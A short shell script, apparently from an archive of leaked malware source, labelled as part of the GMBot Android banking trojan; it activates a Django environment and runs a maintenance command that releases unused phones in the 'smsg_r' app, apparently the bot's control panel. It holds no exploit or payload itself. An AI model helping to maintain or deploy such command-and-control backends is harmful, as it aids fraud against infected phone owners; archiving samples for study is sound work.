#!/bin/sh
# ------------------------------------------------------------
# name      GMBot
# type      android
# cve       —
# year      unknown
# os        Android
# authors   unknown
# source    RamadhanAmizudin/malware
# archived  RamadhanAmizudin, krisyotam (2026)
# notes     —
# ------------------------------------------------------------

. /home/admin/virtualenv/django/bin/activate

cd /home/admin/apps/smsg_r
python manage.py release_unused_phones

